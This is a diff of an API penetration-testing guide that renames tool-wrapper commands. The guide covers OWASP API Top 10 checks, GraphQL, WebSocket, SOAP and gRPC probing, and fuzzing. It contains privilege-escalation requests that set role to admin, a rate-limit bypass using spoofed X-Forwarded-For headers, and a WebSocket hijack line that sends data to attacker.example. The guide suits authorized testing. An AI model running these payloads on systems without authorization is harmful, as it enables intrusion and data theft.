@@ -12,13 +12,13 @@ Covers: REST APIs, OWASP API Top 10, OpenAPI/Swagger, API inventory, rate-limit 
 
 ```bash
 # Common docs and metadata
-scripts/openghost.sh exec-bash 'for p in /swagger.json /openapi.json /api-docs /docs /redoc /v2/api-docs /swagger/v1/swagger.json /.well-known/openapi.yaml /.well-known/openid-configuration; do echo -n "$p: "; curl -s -o /dev/null -w "%{http_code}\n" https://<target>$p; done'
+openghost bash 'for p in /swagger.json /openapi.json /api-docs /docs /redoc /v2/api-docs /swagger/v1/swagger.json /.well-known/openapi.yaml /.well-known/openid-configuration; do echo -n "$p: "; curl -s -o /dev/null -w "%{http_code}\n" https://<target>$p; done'
 
 # Version discovery
-scripts/openghost.sh exec-bash 'for v in v1 v2 v3 v4 beta old legacy internal; do echo -n "/api/$v: "; curl -s -o /dev/null -w "%{http_code}\n" https://<target>/api/$v; done'
+openghost bash 'for v in v1 v2 v3 v4 beta old legacy internal; do echo -n "/api/$v: "; curl -s -o /dev/null -w "%{http_code}\n" https://<target>/api/$v; done'
 
 # JavaScript API mining
-scripts/openghost.sh exec-bash 'curl -s https://<target>/static/app.js | grep -oE "/api/[A-Za-z0-9_./-]+" | sort -u'
+openghost bash 'curl -s https://<target>/static/app.js | grep -oE "/api/[A-Za-z0-9_./-]+" | sort -u'
 ```
 
 Build an API matrix:
@@ -51,8 +51,8 @@ See `session-auth.md`. Also test:
 Test read and write property exposure:
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -H "Authorization: Bearer <TOKEN>" https://<target>/api/users/me | jq .'
-scripts/openghost.sh exec-bash 'curl -s -X PATCH -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" -d "{\"role\":\"admin\",\"plan\":\"enterprise\"}" https://<target>/api/users/me'
+openghost bash 'curl -s -H "Authorization: Bearer <TOKEN>" https://<target>/api/users/me | jq .'
+openghost bash 'curl -s -X PATCH -H "Authorization: Bearer <TOKEN>" -H "Content-Type: application/json" -d "{\"role\":\"admin\",\"plan\":\"enterprise\"}" https://<target>/api/users/me'
 ```
 
 ### API4: Unrestricted Resource Consumption
@@ -74,8 +74,8 @@ Test:
 Call privileged functions with lower-role tokens:
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -H "Authorization: Bearer <USER_TOKEN>" https://<target>/api/admin/users'
-scripts/openghost.sh exec-bash 'curl -s -X DELETE -H "Authorization: Bearer <USER_TOKEN>" https://<target>/api/users/<id>'
+openghost bash 'curl -s -H "Authorization: Bearer <USER_TOKEN>" https://<target>/api/admin/users'
+openghost bash 'curl -s -X DELETE -H "Authorization: Bearer <USER_TOKEN>" https://<target>/api/users/<id>'
 ```
 
 ### API6: Server-Side Request Forgery
@@ -99,7 +99,7 @@ Check:
 Test rate limits safely:
 
 ```bash
-scripts/openghost.sh exec-bash 'for ip in 1.1.1.{1..10}; do curl -s -H "X-Forwarded-For: $ip" -X POST https://<target>/api/login -d "user=test&pass=bad$ip" -o /dev/null -w "$ip %{http_code}\n"; done'
+openghost bash 'for ip in 1.1.1.{1..10}; do curl -s -H "X-Forwarded-For: $ip" -X POST https://<target>/api/login -d "user=test&pass=bad$ip" -o /dev/null -w "$ip %{http_code}\n"; done'
 ```
 
 ### API9: Improper Inventory Management
@@ -144,13 +144,13 @@ Examples:
 ### Discovery
 
 ```bash
-scripts/openghost.sh exec-bash 'for p in /graphql /graphiql /gql /query /api/graphql /v1/graphql; do echo -n "$p: "; curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Content-Type: application/json" -d "{\"query\":\"{__typename}\"}" https://<target>$p; done'
+openghost bash 'for p in /graphql /graphiql /gql /query /api/graphql /v1/graphql; do echo -n "$p: "; curl -s -o /dev/null -w "%{http_code}\n" -X POST -H "Content-Type: application/json" -d "{\"query\":\"{__typename}\"}" https://<target>$p; done'
 ```
 
 ### Introspection
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -X POST -H "Content-Type: application/json" -d "{\"query\":\"{__schema{types{name,fields{name,type{name kind}}}}}\"}" https://<target>/graphql | jq .'
+openghost bash 'curl -s -X POST -H "Content-Type: application/json" -d "{\"query\":\"{__schema{types{name,fields{name,type{name kind}}}}}\"}" https://<target>/graphql | jq .'
 ```
 
 If disabled, infer schema from:
@@ -199,7 +199,7 @@ mutation { updateUser(input:{name:"x",role:"admin",isAdmin:true}) { id role isAd
 ### Discovery
 
 ```bash
-scripts/openghost.sh exec-bash 'curl -s -I -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" https://<target>/ws'
+openghost bash 'curl -s -I -H "Connection: Upgrade" -H "Upgrade: websocket" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGVzdA==" https://<target>/ws'
 ```
 
 Common paths:
@@ -211,7 +211,7 @@ Common paths:
 ### Testing
 
 ```bash
-scripts/openghost.sh exec-bash 'wscat -c wss://<target>/ws -H "Authorization: Bearer <TOKEN>"'
+openghost run websocat -H='Authorization: Bearer <TOKEN>' wss://<target>/ws
 ```
 
 Test:
@@ -240,7 +240,7 @@ ws.onmessage = e => fetch('https://attacker.example/log?d=' + encodeURIComponent
 ### WSDL Discovery
 
 ```bash
-scripts/openghost.sh exec-bash 'for p in /service?wsdl /api?wsdl /soap?wsdl /wsdl; do echo -n "$p "; curl -s -o /dev/null -w "%{http_code}\n" https://<target>$p; done'
+openghost bash 'for p in /service?wsdl /api?wsdl /soap?wsdl /wsdl; do echo -n "$p "; curl -s -o /dev/null -w "%{http_code}\n" https://<target>$p; done'
 ```
 
 Review WSDL for operations, types, endpoints, and authentication requirements.
@@ -287,8 +287,8 @@ Indicators:
 If `grpcurl` is available:
 
 ```bash
-scripts/openghost.sh exec-bash 'grpcurl -plaintext <target>:<port> list'
-scripts/openghost.sh exec-bash 'grpcurl -H "authorization: Bearer <TOKEN>" <target>:<port> list'
+openghost run grpcurl -plaintext <target>:<port> list
+openghost run grpcurl -H "authorization: Bearer <TOKEN>" <target>:<port> list
 ```
 
 ## API Fuzzing
@@ -297,10 +297,10 @@ Use fuzzing after inventory and scope are clear.
 
 ```bash
 # Parameter discovery
-scripts/openghost.sh exec-tool arjun -u https://<target>/api/search
+openghost run arjun -u https://<target>/api/search
 
 # Endpoint fuzzing
-scripts/openghost.sh exec-tool ffuf -u https://<target>/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,401,403
+openghost run ffuf -u https://<target>/api/FUZZ -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt -mc 200,401,403
 ```
 
 For stateful API fuzzing, import the OpenAPI spec into a suitable fuzzer only with rate limits and test accounts.
